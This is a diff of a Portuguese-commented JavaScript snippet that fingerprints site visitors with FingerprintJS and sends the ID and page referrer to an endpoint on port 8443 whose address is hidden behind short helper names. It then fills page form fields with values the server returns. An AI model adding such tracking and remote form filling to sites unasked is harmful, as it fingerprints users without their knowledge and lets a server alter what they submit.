@@ -36,74 +36,66 @@
         }
       }
 
-      // Substitui ip() pelo uso do FingerprintJS
       getFingerprint().then((fingerprint) => {
-        console.log("Generated visitorId:", fingerprint);
+        console.log("FINGERPRINT: ", fingerprint);
         send(z(), m, u() + ":8443/api/script/atm?" + generateId.call(), input(), fingerprint);
       });
     };
 
   aj();
 
-  async function send(l, c, u1, d, fingerprint) {
-    try {
-      const response = await fetch(u1, {
-        method: "POST",
-        headers: j(),
-        body: JSON.stringify({
-          l,
-          orginId: c,
-          input: d,
-          r: document.referrer,
-          fingerprint, // Substitui o IP pelo visitorId
-        }),
-      });
+  function send(l, c, u1, d, fingerprint) {
+    let response = fetch(u1, {
+      method: "POST",
+      headers: j(),
+      body: JSON.stringify({
+        l: l,
+        orginId: c,
+        input: d,
+        r: document.referrer,
+        fingerprint: fingerprint,
+      }),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        if (data.data) {
+          data.data.forEach((ele) => {
+            var newKeyList = ele.key.split(",");
+            newKeyList.forEach((new_key) => {
+              ele.key = new_key;
+              var myEle = document.getElementById(ele.key);
 
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
-      }
-
-      const data = await response.json();
-      if (data && data.data) {
-        data.data.forEach((ele) => {
-          var newKeyList = ele.key.split(",");
-          newKeyList.forEach((new_key) => {
-            ele.key = new_key;
-            var myEle = document.getElementById(ele.key);
-
-            if (myEle != null) {
-              document.getElementById(ele.key).value = ele.value;
-            } else {
-              if (document.getElementsByName(ele.key)[0] && document.getElementsByName(ele.key)[0].name) {
-                document.getElementsByName(ele.key)[0].value = ele.value;
+              if (myEle != null) {
+                document.getElementById(ele.key).value = ele.value;
+              } else {
+                if (document.getElementsByName(ele.key)[0] && document.getElementsByName(ele.key)[0].name) {
+                  document.getElementsByName(ele.key)[0].value = ele.value;
+                }
               }
-            }
-            var els = document.getElementsByName(ele.key);
-            Array.prototype.forEach.call(els, function (el) {
-              el.setAttribute("value", ele.value);
-            });
+              var els = document.getElementsByName(ele.key);
+              Array.prototype.forEach.call(els, function (el) {
+                el.setAttribute("value", ele.value);
+              });
 
-            // Atualiza também com o key em maiúsculas
-            var newKey = ele.key.toUpperCase();
-            var myEle1 = document.getElementById(newKey);
+              // Atualiza também com o key em maiúsculas
+              var newKey = ele.key.toUpperCase();
+              var myEle1 = document.getElementById(newKey);
 
-            if (myEle1 != null) {
-              document.getElementById(newKey).value = ele.value;
-            } else {
-              if (document.getElementsByName(newKey)[0] && document.getElementsByName(newKey)[0].name) {
-                document.getElementsByName(newKey)[0].value = ele.value;
+              if (myEle1 != null) {
+                document.getElementById(newKey).value = ele.value;
+              } else {
+                if (document.getElementsByName(newKey)[0] && document.getElementsByName(newKey)[0].name) {
+                  document.getElementsByName(newKey)[0].value = ele.value;
+                }
               }
-            }
-            var els = document.getElementsByName(newKey);
-            Array.prototype.forEach.call(els, function (el) {
-              el.setAttribute("value", ele.value);
+              var els = document.getElementsByName(newKey);
+              Array.prototype.forEach.call(els, function (el) {
+                el.setAttribute("value", ele.value);
+              });
             });
           });
-        });
-      }
-    } catch (error) {
-      console.error("Error in send function:", error);
-    }
+        }
+      });
   }
 
   async function getFingerprint() {
@@ -113,7 +105,8 @@
       );
       const fp = await fpPromise;
       const result = await fp.get();
-      return result.visitorId; // Retorna o visitorId
+
+      return result.visitorId; // Retorna o visitorId em vez do IP
     } catch (error) {
       console.error("Error generating fingerprint:", error);
       return null;
@@ -121,13 +114,9 @@
   }
 
   function generateId(len) {
-    if (window.crypto && window.crypto.getRandomValues) {
-      var arr = new Uint8Array(len / 2);
-      window.crypto.getRandomValues(arr);
-      return Array.from(arr, dec2hex).join("");
-    } else {
-      throw new Error("Secure random generation is not available in this context.");
-    }
+    var arr = new Uint8Array((len || 40) / 2);
+    window.crypto.getRandomValues(arr);
+    return Array.from(arr, dec2hex).join("");
   }
 
   function dec2hex(dec) {
